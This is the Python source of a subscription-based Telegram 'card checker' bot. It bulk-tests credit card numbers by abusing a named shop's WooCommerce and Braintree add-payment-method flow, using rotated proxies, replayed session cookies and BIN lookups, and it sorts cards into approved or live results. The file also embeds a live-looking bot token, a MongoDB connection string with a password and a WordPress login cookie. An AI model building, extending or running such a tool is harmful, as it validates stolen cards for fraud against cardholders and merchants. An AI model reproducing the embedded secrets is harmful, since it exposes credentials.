import asyncio
import logging
import random
import string
import time
import uuid
from datetime import datetime, timedelta
import base64
import re
import aiohttp
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)
import pymongo
from pymongo import MongoClient
import os
from dotenv import load_dotenv

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Load environment variables
load_dotenv()

# Bot configuration
BOT_TOKEN = os.getenv("BOT_TOKEN", "8009942983:AAGCC4oPE1XBfclabG4Zm7s4OCBYv_-gf-s")
OWNER_ID = 7593550190
CHECKING_LIMITS = {"Gold": 500, "Platinum": 1000, "Owner": 3000}
CONCURRENT_REQUESTS = 3
TIMEOUT_SECONDS = 70
COOKIE_REFRESH_INTERVAL = 3600  # 1 hour
WEBSITE_URL = "https://www.woolroots.com"
WEBSITE_PLACEHOLDER = "[Website]"

# MongoDB setup
try:
    client = MongoClient(
        "mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0",
        serverSelectionTimeoutMS=10000
    )
    client.admin.command('ping')
    db = client["fn_checker"]
    users_collection = db["users"]
    keys_collection = db["keys"]
    progress_collection = db["progress"]
    cookies_collection = db["cookies"]
except Exception as e:
    logger.error(f"MongoDB connection failed: {e}")
    raise

# Cookie lock
COOKIE_LOCK = asyncio.Lock()

# Card type mapping
CARD_TYPE_MAP = {
    "VISA": "visa",
    "MASTERCARD": "mastercard",
    "AMEX": "amex",
    "DISCOVER": "discover",
    "Unknown": "visa"  # Fallback
}

# Initialize cookies
def load_cookies():
    cookie_doc = cookies_collection.find_one({"key": "session_cookies"})
    if cookie_doc and "cookies" in cookie_doc:
        return cookie_doc["cookies"]
    return {
        "sbjs_migrations": "1418474375998%3D1",
        "sbjs_current_add": "fd%3D2025-06-04%2009%3A09%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.woolroots.com%2F%7C%7C%7Crf%3D%28none%29",
        "sbjs_first_add": "fd%3D2025-06-04%2009%3A09%3A15%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.woolroots.com%2F%7C%7C%7Crf%3D%28none%29",
        "sbjs_current": "typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29",
        "sbjs_first": "typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29",
        "sbjs_udata": "vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36",
        "PHPSESSID": "pv0b1l1avd10nrudlr5ft2e6tb",
        "wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221": "electraop%7C1750239642%7CvF1ijGS4QZglze3afPNmFp9UnNpOVXCNwWaNS6aeDrn%7C6de83df07278412bcad730cce87f24a0d498899bfec189b49d068cb2af98020d",
        "sbjs_session": "pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.woolroots.com%2Fmy-account%2F"
    }

SESSION_COOKIES = load_cookies()

# Load proxies
def load_proxies():
    try:
        with open("proxies.txt", "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
            return proxies if proxies else []
    except Exception as e:
        logger.error(f"Failed to load proxies: {e}")
        return []

PROXIES = load_proxies()

async def save_cookies():
    async with COOKIE_LOCK:
        try:
            cookies_collection.update_one(
                {"key": "session_cookies"},
                {"$set": {"cookies": SESSION_COOKIES, "updated_at": datetime.utcnow()}},
                upsert=True
            )
            logger.info("Cookies saved to MongoDB")
        except Exception as e:
            logger.error(f"Failed to save cookies to MongoDB: {e}")

async def test_proxy(proxy: str) -> bool:
    try:
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False),
            timeout=aiohttp.ClientTimeout(total=10)
        ) as session:
            async with session.get("https://www.google.com", proxy=proxy) as response:
                return response.status == 200
    except Exception as e:
        logger.error(f"Proxy {proxy} test failed: {e}")
        return False

def mask_proxy(proxy: str) -> str:
    try:
        proxy_parts = proxy.split("@")
        proxy_addr = proxy_parts[1] if len(proxy_parts) > 1 else proxy_parts[0].replace("http://", "").replace("https://", "")
        ip_port = proxy_addr.split(":")
        ip = ip_port[0]
        port = ip_port[1] if len(ip_port) > 1 else "80"
        ip_parts = ip.split(".")
        masked_ip = f"{ip_parts[0]}.{ip_parts[1]}.xx.xxx" if len(ip_parts) == 4 else ip
        masked_port = f"{port[:2]}xxx" if len(port) >= 2 else port
        return f"{masked_ip}:{masked_port}"
    except Exception as e:
        logger.error(f"Error masking proxy {proxy}: {e}")
        return "Invalid proxy format"

async def refresh_cookies(context: ContextTypes.DEFAULT_TYPE = None):
    global SESSION_COOKIES
    async with COOKIE_LOCK:
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
                    "Cookie": "; ".join([f"{key}={value}" for key, value in SESSION_COOKIES.items()]),
                }
                async with session.get(f"{WEBSITE_URL}/my-account/", headers=headers, allow_redirects=True) as response:
                    response_text = await response.text()
                    if "g-recaptcha" in response_text or "I'm not a robot" in response_text or "Log in" in response_text:
                        logger.warning("Cookies expired or invalid")
                        if context:
                            await context.bot.send_message(
                                chat_id=OWNER_ID,
                                text=f"Cookies expired. Please log in to {WEBSITE_PLACEHOLDER}/my-account/, copy PHPSESSID and wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221, and use /updatecookies."
                            )
                        return False

                    new_cookies = {}
                    for cookie in response.headers.getall("Set-Cookie", []):
                        if "PHPSESSID=" in cookie:
                            new_cookies["PHPSESSID"] = cookie.split("PHPSESSID=")[1].split(";")[0]
                        elif "wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=" in cookie:
                            new_cookies["wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221"] = cookie.split("wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221=")[1].split(";")[0]

                    if new_cookies:
                        SESSION_COOKIES.update(new_cookies)
                        await save_cookies()
                        logger.info(f"Refreshed cookies: {new_cookies.keys()}")
                        if context:
                            await context.bot.send_message(
                                chat_id=OWNER_ID,
                                text=f"Cookies refreshed: {new_cookies.keys()}"
                            )
                        return True
                    else:
                        logger.info("Cookies still valid")
                        return True
        except Exception as e:
            logger.error(f"Cookie refresh failed: {e}")
            if context:
                await context.bot.send_message(
                    chat_id=OWNER_ID,
                    text=f"Cookie refresh failed: {e}. Please log in to {WEBSITE_PLACEHOLDER}/my-account/, copy PHPSESSID and wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221, and use /updatecookies."
                )
            return False

async def schedule_cookie_refresh(context: ContextTypes.DEFAULT_TYPE):
    while True:
        await refresh_cookies(context)
        await asyncio.sleep(COOKIE_REFRESH_INTERVAL)

async def update_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global SESSION_COOKIES
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Only the owner can update cookies.")
        logger.error(f"Unauthorized /updatecookies by user {user_id}")
        return

    args = context.args
    if len(args) != 2:
        await update.message.reply_text(
            f"Usage: /updatecookies <PHPSESSID> <wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221>\n"
            f"Log in to {WEBSITE_PLACEHOLDER}/my-account/ and copy cookies from browser."
        )
        logger.error("Invalid /updatecookies args")
        return

    async with COOKIE_LOCK:
        new_cookies = {
            "PHPSESSID": args[0],
            "wordpress_logged_in_ee0ffb447a667c514b93ba95d290f221": args[1]
        }
        SESSION_COOKIES.update(new_cookies)
        await save_cookies()
    await update.message.reply_text("Cookies updated successfully ✅")
    logger.info("Cookies updated via /updatecookies")

async def add_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Only the owner can update proxies.")
        logger.error(f"Unauthorized /addproxies by user {user_id}")
        return

    context.user_data["awaiting_proxies"] = True
    await update.message.reply_text("Send proxies.txt file.")
    logger.info("Prompted for proxies.txt")

async def handle_proxies_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID or not context.user_data.get("awaiting_proxies", False):
        await update.message.reply_text("Use /addproxies first to upload proxies.txt.")
        logger.error(f"Unauthorized proxies upload by user {user_id}")
        return

    if not update.message.document or update.message.document.file_name != "proxies.txt":
        await update.message.reply_text("Please upload a file named 'proxies.txt'.")
        logger.error("Invalid proxies file name")
        return

    await update.message.reply_text("Updating proxies...")
    logger.info("Processing proxies.txt")

    try:
        file = await update.message.document.get_file()
        file_content = await file.download_as_bytearray()
        proxies = file_content.decode("utf-8").splitlines()
        proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
        if not proxies:
            await update.message.reply_text("Proxies.txt is empty.")
            logger.error("Empty proxies.txt")
            return

        with open("proxies.txt", "w") as f:
            for proxy in proxies:
                f.write(f"{proxy}\n")

        global PROXIES
        PROXIES = proxies
        context.user_data["awaiting_proxies"] = False
        await update.message.reply_text("Proxies updated! Use /chk to continue.")
        logger.info("Proxies updated")
    except Exception as e:
        await update.message.reply_text(f"Failed to update proxies: {e}")
        logger.error(f"Proxies update failed: {e}")
        context.user_data["awaiting_proxies"] = False

async def get_bin_info(bin_number: str) -> dict:
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status != 200:
                    logger.error(f"BIN lookup failed for {bin_number}: Status {response.status}")
                    return {
                        "brand": "Unknown",
                        "level": "Unknown",
                        "type": "Unknown",
                        "bank": "Unknown",
                        "country_name": "Unknown",
                        "country_flag": ""
                    }
                data = await response.json()
                return {
                    "brand": data.get("brand", "Unknown").upper(),
                    "level": data.get("level", "Unknown"),
                    "type": data.get("type", "Unknown"),
                    "bank": data.get("bank", "Unknown"),
                    "country_name": data.get("country_name", "Unknown"),
                    "country_flag": data.get("country_flag", "")
                }
    except Exception as e:
        logger.error(f"BIN lookup failed for {bin_number}: {e}")
        return {
            "brand": "Unknown",
            "level": "Unknown",
            "type": "Unknown",
            "bank": "Unknown",
            "country_name": "Unknown",
            "country_flag": ""
        }

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Upload Files", callback_data="upload"), InlineKeyboardButton("Cancel Check", callback_data="cancel")],
        [InlineKeyboardButton("Help", callback_data="help")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"""🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐅𝐍-𝐁3 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭! 🔥

🔖 𝐔𝐬𝐞 /chk 𝐭𝐨 𝐜𝐡𝐞𝐜𝐤 𝐚 𝐬𝐢𝐧𝐠𝐥𝐞 𝐂𝐂
📦 𝐔𝐩𝐥𝐨𝐚𝐝 𝐚 𝐟𝐢𝐥𝐞 𝐭𝐨 𝐜𝐡𝐞𝐜𝐤 𝐦𝐮𝐥𝐭𝐢𝐩𝐥𝐞 𝐂𝐂𝐬 𝐨𝐫 𝐮𝐬𝐞 𝐭𝐡𝐞 𝐛𝐮𝐭𝐭𝐨𝐧𝐬 𝐛𝐞𝐥𝐨𝐰:""",
        reply_markup=reply_markup
    )
    logger.info("Start command executed")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if query.data == "upload":
        await query.message.reply_text("Send your .txt file for checking")
        logger.info("Upload button clicked")
    elif query.data in ["cancel", "stop"]:
        progress_collection.update_one({"user_id": user_id}, {"$set": {"stopped": True}})
        await query.message.reply_text("Checking cancelled ✅")
        logger.info("Cancel/Stop button clicked")
    elif query.data == "help":
        await query.message.reply_text(
            f"""**Help Menu**

/start - Start the bot
/chk <cc> - Check a single CC (format: number|mm|yy|cvv)
/redeem <key> - Redeem a premium key
/stop - Stop current checking process
/updatecookies <PHPSESSID> <wordpress_logged_in_...> - Update cookies (owner only)
/addproxies - Upload proxies.txt (owner only)
Send a .txt file to check multiple CCs"""
        )
        logger.info("Help button clicked")

async def check_cc(cx: str, user_id: int, tier: str, context: ContextTypes.DEFAULT_TYPE) -> dict:
    start_time = time.time()
    try:
        parts = cx.split("|")
        if len(parts) != 4:
            return {"status": "Error", "card": cx, "error": "Invalid CC format"}
        cc, mes, ano, cvv = parts
        if not (len(cc) == 16 and mes.isdigit() and len(mes) == 2 and cvv.isdigit() and len(cvv) == 3):
            return {"status": "Error", "card": cx, "error": "Invalid CC data"}
        # Handle year (2 or 4 digits)
        ano_exp = ano if len(ano) == 4 else f"20{ano}"
        if not ano_exp.isdigit() or len(ano_exp) != 4:
            return {"status": "Error", "card": cx, "error": "Invalid year format"}

        bin_number = cc[:6]
        card_details = await get_bin_info(bin_number)

        proxy = random.choice(PROXIES) if PROXIES else None
        proxy_status = "None"
        proxy_is_live = False
        if proxy:
            proxy_is_live = await test_proxy(proxy)
            masked_proxy = mask_proxy(proxy)
            proxy_status = f"{masked_proxy} {'𝐋𝐢𝐯𝐞 ✅' if proxy_is_live else '𝐃𝐞𝐚𝐝 ❌'}"

        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            connector=aiohttp.TCPConnector(ssl=True) if not proxy or not proxy_is_live else aiohttp.TCPConnector(ssl=False)
        ) as session:
            async with COOKIE_LOCK:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Cookie": "; ".join([f"{k}={v}" for k, v in SESSION_COOKIES.items()]),
                }
                async with session.get(f"{WEBSITE_URL}/my-account/add-payment-method/", headers=headers) as response:
                    response_text = await response.text()
                    logger.debug(f"Add payment method response: {response_text[:500]}...")
                    if "g-recaptcha" in response_text or "I'm not a robot" in response_text:
                        logger.warning("reCAPTCHA detected")
                        await context.bot.send_message(
                            chat_id=OWNER_ID,
                            text=f"reCAPTCHA detected. Please log in to {WEBSITE_PLACEHOLDER}/my-account/, copy cookies, and use /updatecookies."
                        )
                        return {"status": "Error", "card": cx, "error": "reCAPTCHA detected"}
                    nonce_match = re.search(r'"client_token_nonce":"(.*?)"', response_text)
                    if not nonce_match:
                        logger.error(f"No nonce found: {response_text[:500]}")
                        return {"status": "Error", "card": cx, "error": "No client token nonce"}

            async with COOKIE_LOCK:
                headers = {
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin": WEBSITE_URL,
                    "Referer": f"{WEBSITE_URL}/my-account/add-payment-method/",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest",
                    "Cookie": "; ".join([f"{k}={v}" for k, v in SESSION_COOKIES.items()]),
                }
                data = {"action": "wc_braintree_credit_card_get_client_token", "nonce": nonce_match.group(1)}
                async with session.post(f"{WEBSITE_URL}/wp-admin/admin-ajax.php", headers=headers, data=data) as response:
                    response_text = await response.text()
                    logger.debug(f"Client token response: {response_text[:500]}...")
                    token_match = re.search(r'"data":"(.*?)"', response_text)
                    if not token_match:
                        logger.error(f"No token data: {response_text[:500]}")
                        return {"status": "Error", "card": cx, "error": "No token data"}
                    token = token_match.group(1)
                    try:
                        decoded_text = base64.b64decode(token).decode()
                    except Exception as e:
                        logger.error(f"Token decode error: {e}")
                        return {"status": "Error", "card": cx, "error": f"Token decode error: {e}"}
                    au_match = re.search(r'"authorizationFingerprint":"(.*?)"', decoded_text)
                    if not au_match:
                        logger.error(f"No authorization: {decoded_text[:500]}")
                        return {"status": "Error", "card": cx, "error": "No authorization fingerprint"}
                    auth_fingerprint = au_match.group(1)

            headers = {
                "authority": "payments.braintree-api.com",
                "accept": "*/*",
                "authorization": f"Bearer {auth_fingerprint}",
                "braintree-version": "2018-05-10",
                "content-type": "application/json",
                "origin": "https://assets.braintreegateway.com",
                "Referer": "https://assets.braintreegateway.com/",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
            }
            json_data = {
                "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": str(uuid.uuid4())},
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear } } }",
                "variables": {
                    "input": {
                        "creditCard": {"number": cc, "expirationMonth": mes, "expirationYear": ano_exp, "cvv": cvv},
                        "options": {"validate": True}
                    }
                },
                "operationName": "TokenizeCreditCard",
            }
            async with session.post("https://payments.braintree-api.com/graphql", headers=headers, json=json_data) as response:
                try:
                    result = await response.json()
                    token = result.get("data", {}).get("tokenizeCreditCard", {}).get("token")
                    if not token:
                        logger.error(f"Braintree tokenization failed: {result}")
                        return {"status": "Error", "card": cx, "error": f"Braintree error: {result.get('errors', 'Unknown')}"}
                except Exception as e:
                    logger.error(f"Braintree response error: {e}")
                    return {"status": "Error", "card": cx, "error": f"Braintree error: {e}"}

            async with COOKIE_LOCK:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Cookie": "; ".join([f"{k}={v}" for k, v in SESSION_COOKIES.items()]),
                }
                async with session.get(f"{WEBSITE_URL}/my-account/add-payment-method/", headers=headers) as response:
                    response_text = await response.text()
                    logger.debug(f"Payment method page: {response_text[:500]}...")
                    pay_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response_text)
                    if not pay_match:
                        logger.error(f"No payment nonce: {response_text[:500]}")
                        return {"status": "Error", "card": cx, "error": "No payment nonce"}
                    pay_nonce = pay_match.group(1)

            async with COOKIE_LOCK:
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": WEBSITE_URL,
                    "Referer": f"{WEBSITE_URL}/my-account/add-payment-method/",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
                    "Cookie": "; ".join([f"{k}={v}" for k, v in SESSION_COOKIES.items()]),
                }
                data = {
                    "payment_method": "braintree_credit_card",
                    "wc-braintree-credit-card-card-type": CARD_TYPE_MAP.get(card_details["brand"], "visa"),
                    "wc-braintree-credit-card-3d-secure-enabled": "",
                    "wc-braintree-credit-card-3d-secure-verified": "",
                    "wc-braintree-credit-card-3d-secure-order-total": "0.00",
                    "wc_braintree_credit_card_payment_nonce": token,
                    "wc_braintree_device_data": '{"correlation_id":"' + str(uuid.uuid4()) + '"}',
                    "wc-braintree-credit-card-tokenize-payment-method": "true",
                    "woocommerce-add-payment-method-nonce": pay_nonce,
                    "_wp_http_referer": "/my-account/add-payment-method/",
                    "woocommerce_add_payment_method": "1"
                }
                async with session.post(f"{WEBSITE_URL}/my-account/add-payment-method/", headers=headers, data=data) as response:
                    response_text = await response.text()
                    logger.info(f"Website response for card {cx[:6]}xxxxxx{cx[-4:]}: {response_text[:500]}...")
                    soup = BeautifulSoup(response_text, "html.parser")
                    # Try multiple selectors for response
                    message_elem = (
                        soup.find("div", class_="woocommerce-message") or
                        soup.find("div", class_="woocommerce-error") or
                        soup.find("li", class_="woocommerce-error") or
                        soup.find("ul", class_="woocommerce-error") or
                        soup.find("li", class_="woocommerce-notice")
                    )
                    if message_elem:
                        msg = message_elem.text.strip()
                    else:
                        msg_elem = soup.find("body") or soup.find("p")
                        msg = msg_elem.text.strip() if msg_elem else "Unknown server response"
                    if not msg:
                        msg = "Unknown server response"

            card_info = f"{cc[:6]}xxxxxx{cc[-4:]} | {mes}/{ano} | {cvv}"
            # Modified status determination and response message
            if "new payment method added" in msg.lower() or "successfully added" in msg.lower():
                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
            elif "insufficient funds" in msg.lower():
                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
            elif "duplicate card exists" in msg.lower():
                status = "𝐃𝐮𝐩𝐥𝐢𝐜𝐚𝐭𝐞 ❌"
            elif "cvv" in msg.lower() and "declined" in msg.lower():
                status = "𝐂𝐂𝐍 ✅"
            else:
                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"

            result = {
                "message": "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if status == "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" else msg,
                "original_message": msg,  # Store original message for hits file
                "issuer": card_details["bank"],
                "country": f"{card_details['country_name']} {card_details['country_flag']}",
                "time_taken": time.time() - start_time,
                "proxy_status": proxy_status,
                "card_info": f"{card_details['brand']} - {card_details['level']} - {card_details['type']}"
            }

            return {
                "status": status,
                "card": cx,
                "card_info": card_info,
                "result": result,
                "checked_by": f"<a href='tg://user?id={user_id}'>{user_id}</a>",
                "tier": tier
            }
    except Exception as e:
        logger.error(f"Error checking CC {cx[:6]}xxxxxx{cx[-4:]}: {e}")
        return {"status": "Error", "card": cx, "error": str(e)}

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = users_collection.find_one({"user_id": user_id})
    if not user or "expiration" not in user or user["expiration"] < datetime.utcnow():
        await update.message.reply_text("You need an active subscription. Use /redeem <key> to activate.")
        logger.error(f"User {user_id} has no active subscription")
        return

    tier = user["tier"]
    args = context.args
    if len(args) != 1 or not re.match(r"^\d{16}\|\d{2}\|\d{2,4}\|\d{3}$", args[0]):
        await update.message.reply_text("Invalid format. Use: /chk 4242424242424242|02|27|042")
        logger.error("Invalid CC format in /chk")
        return

    checking_msg = await update.message.reply_text("Checking CC... Please wait.")
    result = await check_cc(args[0], user_id, tier, context)

    await checking_msg.delete()
    if result["status"] == "Error":
        await update.message.reply_text(f"Error: {result['error']}")
        logger.error(f"CC check failed: {result['error']}")
        return

    response = (
        f"{result['status']}\n\n"
        f"[ϟ] 𝗖𝗮𝗿𝗱: <code>{result['card']}</code>\n"
        f"[ϟ] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Braintree Auth\n"
        f"[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result['result']['message']}\n\n"
        f"[ϟ] 𝗜𝗻𝗳𝗼: {result['result']['card_info']}\n"
        f"[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿: {result['result']['issuer']}\n"
        f"[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {result['result']['country']}\n\n"
        f"[⌬] 𝗧𝗶𝗺𝗲: {result['result']['time_taken']:.2f} seconds\n"
        f"[⌬] 𝐏𝗿𝗼𝘅𝘆: <code>{result['result']['proxy_status']}</code>\n"
        f"[⌬] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {result['checked_by']} ({result['tier']})\n"
        f"[⌬] 𝗕𝗼𝘁: <a href='tg://user?id=8009942983'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>"
    )
    await update.message.reply_text(response, parse_mode="HTML")
    logger.info("CC check completed")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = users_collection.find_one({"user_id": user_id})
    if not user or "expiration" not in user or user["expiration"] < datetime.utcnow():
        await update.message.reply_text("You need an active subscription. Use /redeem <key> to activate.")
        logger.error(f"User {user_id} has no active subscription")
        return

    tier = user["tier"]
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    try:
        cards = file_content.decode("utf-8").splitlines()
        cards = [card.strip() for card in cards if re.match(r"^\d{16}\|\d{2}\|\d{2,4}\|\d{3}$", card.strip())]
    except UnicodeDecodeError as e:
        await update.message.reply_text("Invalid file encoding. Use UTF-8 encoded .txt file.")
        logger.error(f"Invalid file encoding in file upload: {e}")
        return

    if not cards:
        await update.message.reply_text("No valid CCs found in the file.")
        logger.error("No valid CCs found in file")
        return

    if len(cards) > CHECKING_LIMITS[tier]:
        await update.message.reply_text(f"Your tier ({tier}) allows checking up to {CHECKING_LIMITS[tier]} cards.")
        cards = cards[:CHECKING_LIMITS[tier]]
        logger.info(f"Limited to {CHECKING_LIMITS[tier]} cards for tier {tier}")

    await update.message.reply_text(
        f"""✅ **File Received! Starting Check...**

⚡ **Progress**: Updates every 10 cards/sec"""
    )
    logger.info("File checking started")

    progress_collection.insert_one({
        "user_id": user_id,
        "total": len(cards),
        "approved": 0,
        "declined": 0,
        "ccn": 0,
        "duplicate": 0,  # Added for tracking duplicates
        "checked": 0,
        "start_time": time.time(),
        "results": [],
        "stopped": False,
        "last_response": "None"
    })

    async def update_progress(progress_message):
        while True:
            progress = progress_collection.find_one({"user_id": user_id})
            if not progress or progress["checked"] >= progress["total"] or progress.get("stopped", False):
                break
            approved = progress["approved"]
            declined = progress["declined"]
            ccn = progress["ccn"]
            duplicate = progress["duplicate"]
            checked = progress["checked"]
            total = progress["total"]
            last_response = progress["last_response"]
            keyboard = [[
                InlineKeyboardButton(f"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅: {approved}", callback_data="noop"),
                InlineKeyboardButton(f"𝗖𝗖𝗡 ✅: {ccn}", callback_data="noop"),
                InlineKeyboardButton(f"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌: {declined}", callback_data="noop"),
                InlineKeyboardButton(f"𝗗𝘂𝗽𝗹𝗶𝗰𝗮𝘁𝗲 ❌: {duplicate}", callback_data="noop")
            ], [
                InlineKeyboardButton(f"𝗦𝘁𝗼𝗽 🔴", callback_data="stop"),
                InlineKeyboardButton(f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 💎: {last_response}", callback_data="noop")
            ]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await context.bot.edit_message_text(
                    chat_id=update.message.chat_id,
                    message_id=progress_message.message_id,
                    text=f"Checking Progress...\nTotal: {total}\nChecked: {checked}",
                    reply_markup=reply_markup
                )
            except:
                pass
            await asyncio.sleep(5)

    progress_message = await update.message.reply_text("Starting progress...")
    asyncio.create_task(update_progress(progress_message))

    results = []
    for i in range(0, len(cards), CONCURRENT_REQUESTS):
        progress = progress_collection.find_one({"user_id": user_id})
        if progress.get("stopped", False):
            break
        batch = cards[i:i + CONCURRENT_REQUESTS]
        tasks = [check_cc(card, user_id, tier, context) for card in batch]
        batch_results = await asyncio.gather(*tasks)
        results.extend(batch_results)
        progress = progress_collection.find_one({"user_id": user_id})
        for result in batch_results:
            if result["status"] == "Error":
                if "reCAPTCHA detected" in result["error"]:
                    await update.message.reply_text("Checking paused due to reCAPTCHA. Use /updatecookies.")
                    progress_collection.update_one({"user_id": user_id}, {"$set": {"stopped": True}})
                    return
                continue
            if result["status"] == "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅":
                progress["approved"] += 1
            elif result["status"] == "𝐂𝐂𝐍 ✅":
                progress["ccn"] += 1
            elif result["status"] == "𝐃𝐮𝐩𝐥𝐢𝐜𝐚𝐭𝐞 ❌":
                progress["duplicate"] += 1
            else:
                progress["declined"] += 1
            progress["checked"] += 1
            progress["results"].append(result)
            progress["last_response"] = result["result"]["message"]
            progress_collection.update_one({"user_id": user_id}, {"$set": progress})
        if progress["checked"] % 10 == 0:
            await update.message.reply_text(f"Checked {progress['checked']} cards")
        await asyncio.sleep(TIMEOUT_SECONDS)

    progress = progress_collection.find_one({"user_id": user_id})
    if not progress:
        return
    total_time = time.time() - progress["start_time"]
    avg_speed = progress["checked"] / total_time if total_time > 0 else 0
    success_rate = (progress["approved"] + progress["ccn"]) / progress["total"] * 100 if progress["total"] > 0 else 0
    summary = (
        f"""[⌬] **FN Checker Hits** 😈⚡
━━━━━━━━━━━━━━━━━━━━━━
[✅] 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {progress['approved']}
[❌] 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {progress['declined']}
[✅] 𝗖𝗖𝗡: {progress['ccn']}
[❌] 𝗗𝘂𝗽𝗹𝗶𝗰𝗮𝘁𝗲: {progress['duplicate']}
[🔍] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱: {progress['checked']}/{progress['total']}
